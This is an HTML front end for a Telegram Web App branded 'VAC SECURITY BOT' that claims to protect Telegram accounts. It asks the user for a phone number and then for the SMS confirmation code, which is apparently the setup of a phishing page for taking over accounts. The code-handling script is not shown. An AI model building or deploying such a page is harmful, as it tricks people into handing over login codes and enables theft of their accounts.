<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VAC SECURITY BOT</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>VAC SECURITY BOT</h1>
            <p>Защитите свой Telegram аккаунт</p>
        </header>

        <div class="form-container" id="phone-form">
            <div class="input-group">
                <input type="tel" id="phone" placeholder="Введите номер телефона">
            </div>
            <button id="submit-phone" class="btn">Продолжить</button>
            <button id="share-phone" class="btn secondary">Поделиться номером</button>
        </div>

        <div class="form-container hidden" id="code-form">
            <div class="input-group">
                <input type="text" id="code" placeholder="Введите код из SMS">
            </div>
            <button id="submit-code" class="btn">Подтвердить</button>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
